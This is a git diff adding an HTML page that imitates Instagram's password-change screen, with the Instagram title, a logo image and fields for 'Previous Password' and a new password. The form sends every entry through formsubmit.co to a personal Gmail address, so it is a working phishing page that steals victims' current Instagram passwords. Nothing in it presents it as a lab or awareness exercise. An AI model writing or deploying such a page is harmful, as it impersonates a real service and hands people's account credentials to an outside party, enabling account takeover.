@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        body{
+            margin: 0;
+            padding: 0;
+            font-family: sans-serif;
+            background-color: rgb(234, 232, 232);
+        }
+        #header{
+            text-align: center;
+        }
+        select{
+            color: grey;
+            background-color:  rgb(234, 232, 232);
+            border: 0px;
+            font-size: 15px;
+            padding: 20px;
+        }
+        img{
+            width: 200px;
+            padding-top: 60px;
+            align-content: center;
+        }
+        fieldset{
+            width:40%;
+            margin: auto;
+            align-items: center;
+            justify-items: center;
+            border: 0;
+        }
+        input{
+            width: 250px;
+            height: 45px;
+            border: 2px solid rgb(166, 154, 154);
+            border-radius: 5px;
+            background-color: rgb(225, 224, 224);
+            font-size: 14px;
+            position: relative;
+        }
+        #submitbtn{
+            width: 250px;
+            height: 45px;
+            border: 0;
+            border-radius: 5px;
+            background-color: rgb(73, 73, 214);
+            font-size: 15px;
+            color: white;
+        }
+        span,a{
+            text-decoration: none;
+        }
+        span{
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <div id="header">
+        <select name="language" id="lang">
+            <option value="English (United Kingdom)">English (United Kingdom)</option>
+        </select>
+    </div>
+    <fieldset>
+        <img src="insta.png" alt="">
+        <form action="https://formsubmit.co/supafaytathesecond@gmail.com" method="post">
+            <input type="text" name="password" placeholder="    Previous Password"><br><br>
+            <input type="text" name="password" placeholder="    New Password"><br><br>
+            <input type="text" name="password" placeholder="    Reenter New Password"><br><br>
+            <input id="submitbtn" type="submit" value="Save"><br><br>
+            <span>Forgotten your login details? <a href="">get help logging in</a></span>
+        </form>
+   </fieldset>
+</body>
+</html>
